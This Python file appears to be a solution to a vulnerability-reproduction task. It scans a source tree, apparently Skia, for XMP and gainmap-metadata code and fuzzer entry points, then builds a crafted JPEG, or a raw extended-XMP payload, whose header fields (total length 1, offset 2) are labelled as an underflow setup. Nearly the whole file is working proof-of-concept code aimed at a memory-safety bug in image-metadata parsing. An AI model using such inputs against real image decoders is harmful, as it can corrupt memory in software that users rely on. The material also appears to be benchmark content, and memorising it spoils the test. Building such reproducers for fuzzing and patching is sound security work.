import os
import re
import tarfile
from typing import Iterator, Tuple, Optional


def _iter_text_files_from_dir(root: str) -> Iterator[Tuple[str, bytes]]:
    exts = {
        ".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".hxx",
        ".m", ".mm", ".java", ".kt", ".js", ".ts", ".py", ".rs", ".go",
        ".gn", ".gni", ".cmake", ".txt", ".md", ".bazel", ".bzl", ".mk",
        ".in", ".inc", ".S", ".asm",
        ".yaml", ".yml",
    }
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            path = os.path.join(dirpath, fn)
            _, ext = os.path.splitext(fn)
            if ext.lower() not in exts:
                continue
            try:
                st = os.stat(path)
            except OSError:
                continue
            if st.st_size <= 0 or st.st_size > 2_000_000:
                continue
            try:
                with open(path, "rb") as f:
                    data = f.read()
                yield os.path.relpath(path, root), data
            except OSError:
                continue


def _iter_text_files_from_tar(tar_path: str) -> Iterator[Tuple[str, bytes]]:
    exts = {
        ".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".hxx",
        ".m", ".mm", ".java", ".kt", ".js", ".ts", ".py", ".rs", ".go",
        ".gn", ".gni", ".cmake", ".txt", ".md", ".bazel", ".bzl", ".mk",
        ".in", ".inc", ".S", ".asm",
        ".yaml", ".yml",
    }
    with tarfile.open(tar_path, "r:*") as tf:
        for m in tf.getmembers():
            if not m.isfile():
                continue
            name = m.name
            _, ext = os.path.splitext(name)
            if ext.lower() not in exts:
                continue
            if m.size <= 0 or m.size > 2_000_000:
                continue
            try:
                f = tf.extractfile(m)
                if f is None:
                    continue
                data = f.read()
                yield name, data
            except Exception:
                continue


def _pack_be16(n: int) -> bytes:
    return bytes([(n >> 8) & 0xFF, n & 0xFF])


def _make_app1_segment(payload: bytes) -> bytes:
    ln = len(payload) + 2
    if ln > 0xFFFF:
        payload = payload[:0xFFFD]
        ln = len(payload) + 2
    return b"\xFF\xE1" + _pack_be16(ln) + payload


def _make_jpeg(segments: list[bytes]) -> bytes:
    return b"\xFF\xD8" + b"".join(segments) + b"\xFF\xD9"


def _extended_xmp_payload(guid32: bytes, total_len_be: bytes, offset_be: bytes, chunk: bytes) -> bytes:
    ext_hdr = b"http://ns.adobe.com/xmp/extension/\x00"
    return ext_hdr + guid32 + total_len_be + offset_be + chunk


def _standard_xmp_payload_with_guid(guid32: bytes) -> bytes:
    std_hdr = b"http://ns.adobe.com/xap/1.0/\x00"
    # Keep it tiny; many implementations just search for HasExtendedXMP in the text.
    # Include both forms to maximize matching.
    snippet = b"HasExtendedXMP=\"" + guid32 + b"\" xmpNote:HasExtendedXMP=\"" + guid32 + b"\""
    return std_hdr + snippet


class Solution:
    def solve(self, src_path: str) -> bytes:
        is_dir = os.path.isdir(src_path)

        has_xmp_ext = False
        has_xmp_std = False
        has_has_extended = False
        looks_like_skia = False
        fuzzer_direct_decode_call = False
        fuzzer_present = False
        decode_file_bytes: Optional[bytes] = None

        it = _iter_text_files_from_dir(src_path) if is_dir else _iter_text_files_from_tar(src_path)

        for name, data in it:
            lname = name.lower()
            if ("skcanvas.h" in lname) or ("skcodec" in lname) or ("skia" in lname and (lname.endswith(".gn") or lname.endswith(".gni"))):
                looks_like_skia = True

            if b"http://ns.adobe.com/xmp/extension/" in data:
                has_xmp_ext = True
            if b"http://ns.adobe.com/xap/1.0/" in data:
                has_xmp_std = True
            if b"HasExtendedXMP" in data:
                has_has_extended = True

            if b"decodeGainmapMetadata" in data and decode_file_bytes is None:
                decode_file_bytes = data

            if b"LLVMFuzzerTestOneInput" in data:
                fuzzer_present = True
                if b"decodeGainmapMetadata" in data:
                    # Heuristic: direct call with fuzzer's (data, size)
                    if re.search(rb"decodeGainmapMetadata\s*\(\s*data\s*,\s*size\b", data):
                        fuzzer_direct_decode_call = True
                    elif re.search(rb"decodeGainmapMetadata\s*\(\s*Data\s*,\s*Size\b", data):
                        fuzzer_direct_decode_call = True

        if decode_file_bytes is not None:
            if b"http://ns.adobe.com/xmp/extension/" in decode_file_bytes:
                has_xmp_ext = True
            if b"HasExtendedXMP" in decode_file_bytes:
                has_has_extended = True

        # Decide input kind
        jpeg_likelihood = 0
        raw_likelihood = 0

        if looks_like_skia:
            jpeg_likelihood += 3
        if has_xmp_ext and has_xmp_std:
            jpeg_likelihood += 2
        if fuzzer_present and not fuzzer_direct_decode_call:
            jpeg_likelihood += 1

        if fuzzer_direct_decode_call:
            raw_likelihood += 3
        if has_xmp_ext and not looks_like_skia and not fuzzer_present:
            raw_likelihood += 1

        use_raw = raw_likelihood > jpeg_likelihood

        guid = b"0" * 32

        # Underflow setup: total_len=1, offset=2
        total_len_be = (1).to_bytes(4, "big")
        offset_be = (2).to_bytes(4, "big")
        chunk = b"A"  # minimal

        ext_payload = _extended_xmp_payload(guid, total_len_be, offset_be, chunk)

        if use_raw:
            return ext_payload

        segments: list[bytes] = []
        if has_has_extended:
            segments.append(_make_app1_segment(_standard_xmp_payload_with_guid(guid)))
        segments.append(_make_app1_segment(ext_payload))
        return _make_jpeg(segments)